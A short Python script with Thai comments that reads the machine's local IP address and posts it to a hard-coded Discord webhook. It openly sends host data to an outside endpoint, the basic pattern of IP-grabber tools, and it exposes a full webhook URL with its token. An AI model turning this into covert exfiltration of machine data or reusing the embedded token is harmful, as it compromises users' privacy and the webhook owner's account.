import requests
import json
import socket

def get_ip_address():
    try:
        # ใช้ socket เพื่อดึง IP address ของเครื่อง
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
        s.close()
        return ip_address
    except Exception as e:
        print("เกิดข้อผิดพลาดในการดึง IP address:", e)
        return None

def send_to_discord_webhook(ip_address):
    # แทนที่ 'YOUR_DISCORD_WEBHOOK_URL' ด้วย URL ของ Webhook ของ Discord ที่คุณสร้างไว้
    webhook_url = 'https://discord.com/api/webhooks/1247315451516817459/pFNa-f_w_4VnyWwz3chHTXG9m_vnyTD3oxonOOwjcjlG0XbVxoAFwqd4xj8fP0QZDQz6'

    # สร้างข้อความที่จะส่งไปยัง Discord
    message = {
        "content": f"IP address ของเครื่องคือ {ip_address}"
    }

    try:
        # ส่ง POST request ไปยัง Discord webhook
        response = requests.post(
            webhook_url,
            data=json.dumps(message),
            headers={'Content-Type': 'application/json'}
        )
        if response.status_code == 204:
            print("ส่งข้อความไปยัง Discord สำเร็จ")
        else:
            print("เกิดข้อผิดพลาดในการส่งข้อความไปยัง Discord:", response.text)
    except Exception as e:
        print("เกิดข้อผิดพลาดในการส่งข้อความไปยัง Discord:", e)

if __name__ == "__main__":
    ip_address = get_ip_address()
    if ip_address:
        send_to_discord_webhook(ip_address)
